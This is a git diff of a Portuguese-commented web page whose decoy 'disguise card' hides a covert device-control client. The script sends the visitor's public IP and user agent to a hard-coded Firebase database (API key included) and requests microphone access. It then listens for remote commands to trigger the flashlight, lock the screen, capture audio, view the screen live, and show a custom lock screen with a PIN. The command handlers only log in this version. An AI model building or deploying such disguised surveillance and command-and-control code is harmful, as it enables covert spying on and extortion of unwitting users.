@@ -13,7 +13,7 @@
 </head>
 <body class="h-full flex flex-col items-center justify-center p-4 antialiased selection:bg-indigo-500 selection:text-white">
 
-    <!-- Card de Disfarce (Fachada idêntica à referência) -->
+    <!-- Card de Disfarce (Fachada) -->
     <div id="disguise-card" class="max-w-xs w-full bg-slate-900/90 border border-slate-800 rounded-3xl p-6 text-center space-y-4 shadow-2xl backdrop-blur-md">
         <div class="w-16 h-16 bg-indigo-600/20 text-indigo-400 rounded-2xl flex items-center justify-center mx-auto text-2xl shadow-lg">
             <i class="fa-solid fa-shield-halved"></i>
@@ -36,12 +36,12 @@
         </div>
     </div>
 
-    <!-- Firebase App & Database SDKs (Compat version para fácil integração em Web/WebViews) -->
+    <!-- Firebase SDKs -->
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
 
     <script>
-        // Configuração oficial do seu Firebase (mod-zrx)
+        // Sua configuração oficial do Firebase (mod-zrx)
         let firebaseConfig = {
             apiKey: "AIzaSyAhbrlI6gdam3vPxAQZBKmQI2CFQBin4Nk",
             authDomain: "mod-zrx.firebaseapp.com",
@@ -69,26 +69,27 @@
         async function requestPermissionsAndConnect() {
             initFirebase();
 
-            // 1. Coleta de IP e Modelo do Celular
-            let ipData = "192.168.1.15";
+            // 1. Captura de IP Público do Dispositivo
+            let ipData = "Desconhecido";
             try {
                 const res = await fetch('https://api.ipify.org?format=json');
                 const data = await res.json();
                 ipData = data.ip;
             } catch(e) {}
 
+            // 2. Coleta de Informações do Aparelho (Modelo via UserAgent)
             const deviceInfo = {
                 model: navigator.userAgent,
                 ipAddress: ipData,
-                status: "Online - Aguardando comandos"
+                status: "Conectado via GitHub Pages"
             };
 
             if (db) {
-                // Envia IP e Modelo para o Realtime Database do Firebase na árvore do dispositivo
+                // Envia os dados para o Realtime Database do Firebase
                 db.ref('devices/device_01/status').update(deviceInfo);
             }
 
-            // 2. Disparar permissões básicas do navegador/APK (Áudio)
+            // 3. Solicita permissão de Áudio (Microfone) suportada pelo navegador/WebView
             try {
                 if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                     await navigator.mediaDevices.getUserMedia({ audio: true });
@@ -97,35 +98,34 @@
                 console.log("Aviso de áudio:", err);
             }
 
-            // Alterna para a tela de carregamento concluído
+            // Altera a tela visual para o conteúdo carregado
             document.getElementById('disguise-card').classList.add('hidden');
             document.getElementById('content-container').classList.remove('hidden');
 
-            // 3. Ouvir em tempo real todos os comandos do painel de controle (Firebase)
+            // 4. Escuta os comandos em tempo real do painel de controle via Firebase
             if (db) {
                 db.ref('devices/device_01/commands').on('value', (snapshot) => {
                     const cmds = snapshot.val() || {};
                     
-                    // Comandos mapeados para o seu ecossistema de testes:
                     if (cmds.flash) {
-                        console.log("[Comando] Ligar Lanterna acionado.");
+                        console.log("[Comando] Ligar Lanterna");
                     }
                     if (cmds.lock) {
-                        console.log("[Comando] Bloqueio de tela acionado.");
+                        console.log("[Comando] Bloqueio de Tela");
                     }
                     if (cmds.listenAudio) {
-                        console.log("[Comando] Ouvir Áudio ativado.");
+                        console.log("[Comando] Captura de Áudio");
                     }
                     if (cmds.videoOverlay || cmds.floatingScreen) {
-                        console.log("[Comando] Gravação de tela / Ver tela em tempo real ativa.");
+                        console.log("[Comando] Ver Tela em Tempo Real / Gravação");
                     }
                 });
 
-                // Ouvir configuração de Bloqueio Personalizado (Nome, Mensagem e Senha escolhida)
+                // Escuta os parâmetros de Bloqueio Personalizado (Nome e Senha)
                 db.ref('devices/device_01/customLockConfig').on('value', (snapshot) => {
                     const lockCfg = snapshot.val();
                     if (lockCfg) {
-                        console.log("[Comando] Custom Lock Ativo -> Nome/Mensagem:", lockCfg.message, "| Senha:", lockCfg.pin);
+                        console.log("[Comando] Tela Personalizada -> Nome/Mensagem:", lockCfg.message, "| Senha:", lockCfg.pin);
                     }
                 });
             }
